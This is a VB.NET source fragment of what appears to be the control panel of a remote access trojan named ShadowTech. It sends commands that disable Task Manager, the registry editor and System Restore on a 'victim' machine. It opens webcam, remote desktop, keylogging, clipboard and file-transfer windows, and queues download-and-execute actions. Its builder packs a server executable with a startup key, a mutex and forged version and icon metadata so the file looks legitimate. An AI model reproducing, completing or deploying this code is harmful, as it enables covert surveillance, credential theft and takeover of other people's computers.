    Private Sub DisableToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableToolStripMenuItem2.Click
        Send("DisableRegistry|")
    End Sub

    Private Sub EnableToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableToolStripMenuItem2.Click
        Send("EnableRegistry|")
    End Sub

    Private Sub DisableToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableToolStripMenuItem3.Click
        Send("DisableRestore|")
    End Sub

    Private Sub EnableToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableToolStripMenuItem3.Click
        Send("EnableRestore|")
    End Sub

    Private Sub DisableToolStripMenuItem4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableToolStripMenuItem4.Click
        Send("DisableTaskManager|")
    End Sub

    Private Sub EnableToolStripMenuItem4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableToolStripMenuItem4.Click
        Send("EnableTaskManager|")
    End Sub

    Private Sub TextToSpeechToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextToSpeechToolStripMenuItem.Click
        If Db.ShowDialog = DialogResult.OK Then
            Send("TextToSpeech|" & Db.inputText)
        End If
    End Sub

    Sub ShowRemoteDesktop(ByVal c As Connection)
        c.remoteDeskForm.ShowDialog()
    End Sub

    Sub ShowWebcam(ByVal c As Connection)
        c.webcamForm.ShowDialog()
    End Sub

    Sub ShowFileManager(ByVal c As Connection)
        AddHandler c.fileManagerForm.SendFile, AddressOf SendFile
        AddHandler c.fileManagerForm.RetrieveFile, AddressOf RetrieveFile
        c.fileManagerForm.ShowDialog()
        RemoveHandler c.fileManagerForm.SendFile, AddressOf SendFile
        RemoveHandler c.fileManagerForm.RetrieveFile, AddressOf RetrieveFile
    End Sub

    Sub ShowProcessManager(ByVal c As Connection)
        c.processManagerForm.ShowDialog()
    End Sub

    Sub ShowKeystrokeCapture(ByVal c As Connection)
        c.keystrokeCaptureForm.ShowDialog()
    End Sub

    Sub ShowChatSystem(ByVal c As Connection)
        c.chatSystemForm.ShowDialog()
    End Sub

    Sub SendFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String)
        Dim t As New Thread(AddressOf UploadFile)
        t.IsBackground = True : t.Start(ip & "|" & victimLocation & "|" & filepath)
    End Sub

    Sub UploadFile(ByVal info As String)
        Dim cut() As String = info.Split("|")
        For Each itm As ListViewItem In ListView1.Items
            If DirectCast(itm.Tag, Connection).IPAddress = cut(0) Then
                Dim percentage As Integer = 0
                Dim currentAmount As Integer = 0
                Dim f As New IO.FileInfo(cut(2))
                Dim item As New ListViewItem
                item.Text = IO.Path.GetFileName(cut(2))
                item.SubItems.Add(f.Length.ToString & " byte(s)")
                item.SubItems.Add("To Server")
                item.SubItems.Add(TimeOfDay)
                item.SubItems.Add("N/A")
                item.SubItems.Add(percentage & " % Completed")
                Dim id As Integer = (New Random).Next(1, 10000) : item.Tag = id
                ListView4.Items.Add(item)
                Dim remainder As Long = f.Length Mod 100
                Dim sizeOfParts As Long = ((f.Length - remainder) / 100) - 1
                Dim packet(sizeOfParts) As Byte
                Dim fs As New FileStream(cut(2), FileMode.Open, FileAccess.Read)
                Dim tempBytesRead As Integer = fs.Read(packet, 0, sizeOfParts)
                DirectCast(itm.Tag, Connection).Send("Upload|" & cut(1) & IO.Path.GetFileName(cut(2)) & "|" & id, , packet)
                currentAmount += tempBytesRead : percentage = Math.Round(currentAmount / f.Length * 100)
                For Each fileInProgress As ListViewItem In ListView4.Items
                    If Convert.ToInt64(fileInProgress.Tag) = id Then
                        Do
                            Do Until fileInProgress.BackColor = Color.White
                                Application.DoEvents()
                            Loop
                            If Convert.ToInt64(fileInProgress.Tag) = 0 Then
                                DirectCast(itm.Tag, Connection).Send("CancelUpload|" & cut(1) & IO.Path.GetFileName(cut(2)))
                                Exit Sub
                            End If
                            fileInProgress.SubItems(5).Text = percentage & " % Completed"
                            Dim bytesRead As Integer = fs.Read(packet, 0, sizeOfParts)
                            If bytesRead = 0 Then
                                fileInProgress.SubItems(5).Text = "100 % Completed" : item.Tag = 0
                                item.SubItems(4).Text = TimeOfDay : fs.Close() : Exit Sub
                            End If
                            fileInProgress.BackColor = Color.GhostWhite
                            DirectCast(itm.Tag, Connection).Send("UploadContinue|" & cut(1) & IO.Path.GetFileName(cut(2)) & "|" & id, , packet)
                            currentAmount += bytesRead : percentage = Math.Round(currentAmount / f.Length * 100)
                        Loop
                        Exit For
                    End If
                Next
            End If
            Exit For
        Next
    End Sub

    Sub RetrieveFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String, ByVal filesize As String)
        Dim t As New Thread(AddressOf DownloadFile)
        t.IsBackground = True : t.Start(ip & "|" & victimLocation & "|" & filepath & "|" & filesize)
    End Sub

    Sub DownloadFile(ByVal info As String)
        Dim cut() As String = info.Split("|")
        For Each itm As ListViewItem In ListView1.Items
            If DirectCast(itm.Tag, Connection).IPAddress = cut(0) Then
                Dim item As New ListViewItem
                item.Text = Path.GetFileName(cut(2))
                item.SubItems.Add(cut(3) & " byte(s)")
                item.SubItems.Add("From Server")
                item.SubItems.Add(TimeOfDay)
                item.SubItems.Add("N/A")
                item.SubItems.Add("Transfering...")
                Dim id As Integer = (New Random).Next(1, 10000) : item.Tag = id
                ListView4.Items.Add(item)
                DirectCast(itm.Tag, Connection).Send("Download|" & cut(1) & "|" & id & "|" & cut(2))
            End If
            Exit For
        Next
    End Sub

    Sub ShowClipboard(ByVal c As Connection)
        c.clipboardForm.ShowDialog()
    End Sub

    Private Sub Button11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button11.Click
        If File.Exists(Application.StartupPath & "\config.ini") Then File.Delete(Application.StartupPath & "\config.ini")
        Dim settings As String = TextBox4.Text & "|" & TextBox5.Text & "|"
        If CheckBox1.Checked Then settings += "True|" Else settings += "False|"
        If CheckBox2.Checked Then settings += "True|" Else settings += "False|"
        Dim onConnectSettings As String = ""
        For Each item As ListViewItem In ListView2.Items
            onConnectSettings &= item.Text & splitter & item.SubItems(1).Text & splitter & item.SubItems(2).Text & splitter & item.SubItems(3).Text & splitter
        Next
        File.WriteAllText(Application.StartupPath & "\config.ini", Encryption.XOREncryption(key, settings & onConnectSettings))
        MessageBox.Show("The configuration has been saved sucessfully!", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        If TextBox23.Text = "" Or TextBox6.Text = "" Or TextBox24.Text = "" Then
            Exit Sub
        End If
        Dim item As New ListViewItem
        item.Text = TextBox23.Text
        item.SubItems.Add(TextBox6.Text)
        item.SubItems.Add(TextBox24.Text)
        item.SubItems.Add(ComboBox3.SelectedItem.ToString)
        Select Case ComboBox3.SelectedItem.ToString
            Case "Change ID"
                If Db.ShowDialog = DialogResult.OK Then item.Tag = Db.inputText Else Exit Sub
            Case "Visit URL"
                If Db.ShowDialog = DialogResult.OK Then item.Tag = Db.inputText Else Exit Sub
            Case "Download + Execute"
                If Download.ShowDialog = DialogResult.OK Then item.Tag = Download.downloadLink & "|" & Download.filename Else Exit Sub
        End Select
        For Each itm As ListViewItem In ListView2.Items
            If itm.Text = item.Text And itm.SubItems(1).Text = item.SubItems(1).Text And itm.SubItems(2).Text = item.SubItems(2).Text And itm.SubItems(3).Text = item.SubItems(3).Text Then
                Exit Sub
            End If
        Next
        ListView2.Items.Add(item)
        TextBox23.Text = "" : TextBox6.Text = "" : TextBox24.Text = "" : ComboBox3.SelectedIndex = 0
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoveToolStripMenuItem.Click
        For Each item As ListViewItem In ListView2.SelectedItems
            item.Remove()
        Next
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        TextBox12.Text = RandomVariable(20, 30)
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        Dim ofd As New OpenFileDialog With {.Filter = "Icon File (*.ico) |*.ico"}
        If ofd.ShowDialog = DialogResult.OK Then
            PictureBox7.Image = Image.FromFile(ofd.FileName) : PictureBox7.Tag = ofd.FileName
        End If
    End Sub

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        Profile.ShowDialog()
    End Sub

    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        If Db.ShowDialog = DialogResult.OK Then
            If Db.inputText.tolower = "default" Then Exit Sub
            If Not Directory.Exists(Application.StartupPath & "\Profiles\") Then Directory.CreateDirectory(Application.StartupPath & "\Profiles\")
            If File.Exists(Application.StartupPath & "\Profiles\" & Db.inputText & ".stp") Then File.Delete(Application.StartupPath & "\Profiles\" & Db.inputText & ".stp")
            Dim settings As String = ""
            settings &= TextBox7.Text & "|" & TextBox8.Text & "|" & TextBox9.Text & "|" & TextBox10.Text & "|"
            If CheckBox3.Checked Then settings &= "True|" Else settings &= "False|" : settings &= TextBox11.Text & "|"
            If CheckBox4.Checked Then settings &= "True|" Else settings &= "False|"
            If CheckBox5.Checked Then settings &= "True|" Else settings &= "False|" : settings &= TextBox12.Text & "|"
            If CheckBox6.Checked Then settings &= "True|" Else settings &= "False|"
            settings &= ComboBox4.SelectedIndex & "|" : settings &= ComboBox5.SelectedIndex & "|"
            settings &= TextBox13.Text & "|" & TextBox14.Text & "|" & TextBox15.Text & "|" & TextBox16.Text & "|" & TextBox17.Text & "|" & TextBox18.Text & "|" & TextBox19.Text & "|"
            settings &= NumericUpDown1.Value & "." & NumericUpDown2.Value & "." & NumericUpDown3.Value & "." & NumericUpDown4.Value & "|"
            If Not PictureBox7.Image Is Nothing Then settings &= PictureBox7.Tag.ToString
            'Dim ms As New MemoryStream : PictureBox7.Image.Save(ms, Imaging.ImageFormat.Jpeg)
            'Dim imageBytes As Byte() = ms.ToArray : settings &= Convert.ToBase64String(imageBytes)
            IO.File.WriteAllText(Application.StartupPath & "\Profiles\" & Db.inputText & ".stp", Encryption.XOREncryption(key, settings))
        End If
    End Sub

    Private Sub Button9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button9.Click
        If TextBox7.Text = "" Or TextBox8.Text = "" Or TextBox9.Text = "" Or TextBox10.Text = """ Then" Then
            MessageBox.Show("Please make sure all the connection settings are filled in correctly.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        If TextBox12.Text = "" Then
            MessageBox.Show("Please generate a mutex", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        If CheckBox3.Checked And TextBox11.Text = "" Then
            MessageBox.Show("Please input a registry startup key.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        Dim sfd As New SaveFileDialog With {.Filter = "Executable Files (*.exe)|*.exe"}
        If Not sfd.ShowDialog = DialogResult.OK Then Exit Sub
        If sfd.FileName = Application.StartupPath & "\AssemblyChange.exe" Then
            MessageBox.Show("Please select a different filename.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        IO.File.WriteAllBytes(sfd.FileName, My.Resources.ShadowTech_Server)
        Dim settings As String = splitter
        settings &= Encryption.XOREncryption(key, TextBox7.Text) & splitter & Encryption.XOREncryption(key, TextBox8.Text) & splitter & Encryption.XOREncryption(key, TextBox9.Text) & splitter & Encryption.XOREncryption(key, TextBox10.Text) & splitter
        If CheckBox3.Checked Then settings &= Encryption.XOREncryption(key, "True") & splitter Else settings &= Encryption.XOREncryption(key, "False") & splitter
        settings &= Encryption.XOREncryption(key, TextBox11.Text) & splitter
        If CheckBox4.Checked Then settings &= Encryption.XOREncryption(key, "True") & splitter Else settings &= Encryption.XOREncryption(key, "False") & splitter
        If CheckBox5.Checked Then settings &= Encryption.XOREncryption(key, "True") & splitter Else settings &= Encryption.XOREncryption(key, "False") & splitter
        settings &= Encryption.XOREncryption(key, TextBox12.Text) & splitter
        If CheckBox6.Checked Then settings &= Encryption.XOREncryption(key, "True") & splitter Else settings &= Encryption.XOREncryption(key, "False") & splitter
        settings &= Encryption.XOREncryption(key, ComboBox4.SelectedIndex.ToString) & splitter
        settings &= Encryption.XOREncryption(key, ComboBox5.SelectedIndex.ToString) & splitter
        settings &= Encryption.XOREncryption(key, TextBox13.Text) & splitter
        settings &= Encryption.XOREncryption(key, TextBox14.Text) & splitter
        IO.File.AppendAllText(sfd.FileName, settings)
        Try
A:
            If File.Exists(Application.StartupPath & "\AssemblyChange.exe") Then File.Delete(Application.StartupPath & "\AssemblyChange.exe")
            If File.Exists(Application.StartupPath & "\assemblychange.res") Then File.Delete(Application.StartupPath & "\assemblychange.res")
            If File.Exists(Application.StartupPath & "\res.exe") = True Then File.Delete(Application.StartupPath & "\res.exe")
            If File.Exists(Application.StartupPath & "\res.log") = True Then File.Delete(Application.StartupPath & "\res.log")
            If File.Exists(Application.StartupPath & "\res.ini") = True Then File.Delete(Application.StartupPath & "\res.ini")
        Catch
            GoTo A
        End Try
        System.IO.File.WriteAllBytes(Application.StartupPath & "\res.exe", My.Resources.Res)
        Dim source As String = My.Resources.AssemblyChange
        Dim Version = New Collections.Generic.Dictionary(Of String, String) : Version.Add("CompilerVersion", "v2.0")
        Dim Compiler As VBCodeProvider = New VBCodeProvider(Version)
        Dim cResults As CompilerResults
        Dim Options As New CompilerParameters()
        With Options
            .GenerateExecutable = True
            .OutputAssembly = Application.StartupPath & "\AssemblyChange.exe"
            .CompilerOptions = "/target:winexe"
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .MainClass = "X"
        End With
        source = source.Replace("*Title*", TextBox15.Text)
        source = source.Replace("*Company*", TextBox16.Text)
        source = source.Replace("*Product*", TextBox17.Text)
        source = source.Replace("*Copyright*", TextBox18.Text)
        source = source.Replace("*Trademark*", TextBox19.Text)
        source = source.Replace("*version*", NumericUpDown1.Value.ToString & "." & NumericUpDown2.Value.ToString & "." & NumericUpDown3.Value.ToString & "." & NumericUpDown4.Value.ToString)
        cResults = Compiler.CompileAssemblyFromSource(Options, source)
        Dim otherfile As String = Application.StartupPath & "\AssemblyChange.exe"
        Dim resfile As String = Application.StartupPath & "\assemblychange.res"
        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -extract " & otherfile & "," & resfile & ",VERSIONINFO,,", AppWinStyle.Hide)
        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -delete " & sfd.FileName & "," & System.AppDomain.CurrentDomain.BaseDirectory() + "res.exe" & ",VERSIONINFO,,", AppWinStyle.Hide)
        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & sfd.FileName & "," & sfd.FileName & "," & resfile & ",VERSIONINFO,1,", AppWinStyle.Hide)
        If Not PictureBox7.Image Is Nothing Then
            Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & sfd.FileName & ", " & sfd.FileName & ", " & PictureBox7.Tag.ToString & ", " & "icongroup, 1,0", AppWinStyle.Hide)
            'Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & sfd.FileName & ", " & sfd.FileName & ", " & Application.StartupPath & "\ico.ico, icongroup, 1,0", AppWinStyle.Hide)
        End If
        Try
B:
            If File.Exists(Application.StartupPath & "\AssemblyChange.exe") Then File.Delete(Application.StartupPath & "\AssemblyChange.exe")
            If File.Exists(Application.StartupPath & "\assemblychange.res") Then File.Delete(Application.StartupPath & "\assemblychange.res")
            If File.Exists(Application.StartupPath & "\res.exe") = True Then File.Delete(Application.StartupPath & "\res.exe")
            If File.Exists(Application.StartupPath & "\res.log") = True Then File.Delete(Application.StartupPath & "\res.log")
            If File.Exists(Application.StartupPath & "\res.ini") = True Then File.Delete(Application.StartupPath & "\res.ini")
        Catch
            GoTo B
        End Try
        MessageBox.Show("The server has been created successfully.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub Button10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button10.Click
        If Convert.ToInt32(TextBox20.Text) > 65535 Then Exit Sub
        If TextBox21.Text = "" Then Exit Sub
        mappings.Add(TextBox20.Text, ComboBox6.SelectedItem.Text, TextBox20.Text, internalip, True, TextBox21.Text)
        ListView3.Items.Clear()
        Try
            For Each portmapping As NATUPNPLib.IStaticPortMapping In mappings
                Dim lstring() As String = {portmapping.Protocol, portmapping.ExternalPort, portmapping.Description}
                Dim litem As New ListViewItem(lstring) : ListView3.Items.Add(litem)
            Next
        Catch : End Try
    End Sub

    Private Sub RemoveToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoveToolStripMenuItem1.Click
        For Each item As ListViewItem In ListView3.SelectedItems
            Dim portmove As String = item.Text
            Dim protocolmove As String = item.SubItems(1).Text
            mappings.Remove(portmove, protocolmove)
        Next
        ListView3.Items.Clear()
        Try
            For Each portmapping As NATUPNPLib.IStaticPortMapping In mappings
                Dim lstring() As String = {portmapping.Protocol, portmapping.ExternalPort, portmapping.Description}
                Dim litem As New ListViewItem(lstring) : ListView3.Items.Add(litem)
            Next
        Catch
        End Try
    End Sub

    Private Sub CancelTransferToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CancelTransferToolStripMenuItem.Click
        For Each item As ListViewItem In ListView4.SelectedItems
            If Not item.Tag = 0 Then
                item.Tag = 0 : item.BackColor = Color.White
                Do Until stillWritingBytes = False
                    Application.DoEvents()
                Loop
                item.SubItems(5).Text = "Canceled"
            End If
        Next
    End Sub

    Public Function RandomVariable(ByVal minamount As Integer, ByVal maxamount As Integer) As String
        Dim Rand As New Random
        Dim TheVariable As String = Nothing
        Dim CharactersToUse As String = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKHJJGFDSAZXCVBNM1234567890"
        For x As Integer = 1 To Rand.Next(minamount + 1, maxamount)
            Dim PickAChar As Integer = Int((CharactersToUse.Length - 2) * Rnd()) + 1
            TheVariable += (CharactersToUse(PickAChar))
        Next
        Dim letters As String = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKHJJGFDSAZXCVBNM"
        Return letters(Rand.Next(0, letters.Length - 1)) + TheVariable
    End Function
End Class
<Serializable()> Public Class Data
    Implements ISerializable
    Private data As String
    Private pic As Image
    Private bytes() As Byte
    Public Sub New(ByVal s As String, ByVal p As Image, ByVal b() As Byte)
        data = s : pic = p : bytes = b
    End Sub
    Public Sub New(ByVal info As SerializationInfo, ByVal ctxt As StreamingContext)
        data = DirectCast(info.GetValue("data", GetType(String)), String)
        pic = DirectCast(info.GetValue("image", GetType(Image)), Image)
        bytes = DirectCast(info.GetValue("bytes", GetType(Byte())), Byte())
    End Sub
    Public Sub GetObjectData(ByVal info As SerializationInfo, ByVal ctxt As StreamingContext) Implements ISerializable.GetObjectData
        info.AddValue("data", data) : info.AddValue("image", pic) : info.AddValue("bytes", bytes)
    End Sub
    Public Function GetData() As String
        Return data
    End Function
    Public Function GetImage() As Image
        Return pic
    End Function
    Public Function GetBytes() As Byte()
        Return bytes
    End Function
End Class
